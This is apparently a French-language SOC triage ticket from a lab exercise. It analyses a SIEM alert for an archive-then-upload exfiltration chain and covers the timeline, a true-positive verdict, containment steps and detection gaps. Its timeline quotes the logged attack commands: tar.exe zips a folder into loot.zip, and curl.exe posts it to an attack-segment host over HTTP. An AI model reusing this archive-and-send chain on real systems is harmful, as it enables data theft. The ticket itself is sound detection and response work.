# Ticket de triage 01 : chaîne d'exfiltration (alerte 100282, niveau 14)

> Exercice de triage, 2026-10-29. L'analyste reçoit l'alerte **sans connaître le scénario**
> (scénario 11, [writeup 22](../writeup/22-scenario-collection-exfiltration.md)) et la qualifie
> à partir des seules données du SIEM. Ce qui suit est ce que le SIEM permettait d'établir, pas
> ce que nous savions par ailleurs.

## 1. Alerte

| Champ | Valeur |
|---|---|
| Règle | **100282**, niveau 14 : « Chaîne d'exfiltration : archive puis envoi depuis DESKTOP-A2AMF2E en moins de 5 min » |
| Date | 2026-10-29 15:13:11.887 UTC |
| Poste | `DESKTOP-A2AMF2E` (agent `SIEM-Win11`, 10.10.10.101) |
| MITRE | T1560.001 Archive via Utility, T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol |

## 2. Investigation

Pivot : toutes les alertes du poste, plus tout ce qui mentionne l'IP destination, de 15:08 à
15:18 UTC (`alerts.json`, script Python dans le [writeup 25](../writeup/25-dashboard-couverture-mitre.md)).

### Chronologie

| Heure (UTC) | Règle (niveau) | Événement |
|---|---|---|
| 15:13:10.070 | 60106 (3) | ouverture de session réussie |
| 15:13:11.827 | 67027 (3) | `HOSTNAME.EXE` : vérification du nom de la machine (T1082, déduit) |
| 15:13:11.838 | **100280** (8) | `tar.exe -a -c -f C:\Users\Public\loot.zip -C C:\Users\Public docs-lab` |
| 15:13:11.887 | **100282** (14) | `curl.exe -s --max-time 5 -F f=@C:\Users\Public\loot.zip http://10.10.20.10:8080/` |

### Qui

- Compte : `DESKTOP-A2AMF2E\analyste` (compte local, administrateur du poste).
- Processus parent : `powershell.exe`.
- Niveau d'intégrité : **High**, donc PowerShell lancé en administrateur (élévation UAC).
- Répertoire courant : `C:\Windows\system32\` (défaut d'une console administrateur).

### Quoi

- Le dossier `C:\Users\Public\docs-lab` a été archivé en `loot.zip`.
- Son contenu n'est **pas** connu du SIEM : pas de collecte de création de fichier (Sysmon
  EID 11), pas de FIM sur ce dossier.
- Empreintes : `tar.exe` SHA256 `A3AC62FD…6416A8E`, `curl.exe` SHA256 `73D24149…DAFAB805`.
  Ce sont *a priori* les binaires Microsoft d'origine (chemin System32) : à confirmer par
  réputation (VirusTotal), non fait.

### Où

- Destination : `http://10.10.20.10:8080/`, en HTTP en clair, sur un port non standard.
- `10.10.20.10` appartient au **segment d'attaque** (VMnet11), pas à Internet ni au LAN.
- Dans la même fenêtre, cette IP apparaît aussi en source de paquets bloqués vers Internet
  (100302, NTP/UDP 123) : la machine est active et n'a pas d'accès sortant.

### Ce que le SIEM ne permet pas d'établir

- **La réussite de l'envoi et le volume** : aucune trace réseau de la connexion
  10.10.10.101 → 10.10.20.10:8080. pfSense ne journalise pas le trafic autorisé du LAN, et
  l'événement de connexion Sysmon (EID 3, niveau 0) n'est conservé que dans les archives,
  **désactivées** à ce moment (voir writeup 25).
- **Le déclencheur** : l'enchaînement `hostname` → `tar` → `curl` en 60 ms indique un script
  plutôt qu'une saisie manuelle (déduit). L'origine du script n'est pas visible : pas de journal
  PowerShell 4104 (Script Block Logging non activé).

## 3. Qualification

| Question | Réponse |
|---|---|
| Vrai positif ? | **Oui** : une archive est créée puis envoyée en HTTP vers une machine hors LAN, depuis une session administrateur, de façon scriptée |
| Gravité | **Haute** : exfiltration probable, contenu inconnu |
| Faux positif possible ? | Une sauvegarde ou un outil d'administration légitime ferait la même chose : rien ne l'indique (destination sur un segment non référencé, port 8080, HTTP en clair, nom `loot.zip`) |
| Contexte réel | exercice de lab, scénario 11 (connu après coup) |

## 4. Actions recommandées (playbook, non exécutées)

1. **Contenir** : isoler le poste (réponse active ou VLAN de quarantaine) et bloquer
   10.10.20.10 sur pfSense, toutes interfaces.
2. **Préserver** : copier `C:\Users\Public\loot.zip` et `docs-lab` avant suppression, ainsi
   que les journaux PowerShell et Sysmon du poste.
3. **Établir le périmètre** : contenu de l'archive, autres postes ayant contacté 10.10.20.10,
   autres sessions du compte `analyste`.
4. **Compte** : réinitialiser le mot de passe de `analyste`, vérifier comment la session
   administrateur a été obtenue (lien possible avec le brute force du scénario 1).

## 5. Améliorations de détection issues du ticket

| Manque | Correction proposée | Statut |
|---|---|---|
| Pas de preuve réseau de l'envoi | journaliser les *pass* sortants du LAN vers le segment d'attaque sur pfSense, ou garder `logall_json` actif pour Sysmon EID 3 | archives réactivées le 2026-10-29 ; journal pfSense à faire |
| Contenu de l'archive inconnu | FIM sur `C:\Users\Public` (avec `report_changes`) | à évaluer (volume) |
| Script invisible | activer PowerShell Script Block Logging (4104) | à faire |
| Bruit : native **61618** (niveau 12) sur des `svchost.exe` légitimes dans la même fenêtre | liste blanche **100120** | ✅ fait ([writeup 26](../writeup/26-du-triage-au-tuning.md)) |
